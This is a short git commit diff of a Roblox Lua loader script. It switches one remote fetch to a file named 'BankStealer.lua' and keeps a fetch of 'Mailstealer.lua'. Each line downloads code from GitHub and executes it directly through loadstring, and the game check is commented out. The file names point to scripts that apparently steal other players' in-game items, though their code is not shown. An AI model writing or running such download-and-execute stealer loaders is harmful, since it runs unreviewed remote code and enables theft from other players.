8b3cf2d44726fecf4a115ea5d4d8bf98956ddb84
Adidsus <85895319+Adidsus@users.noreply.github.com>
2023-09-10 23:17:27 +0200

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -1,5 +1,5 @@
 -- if game.PlaceId == 13127800756 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/petsimx.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/BankStealer.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/untested/main/Mailstealer.lua"))()
 
     -- end
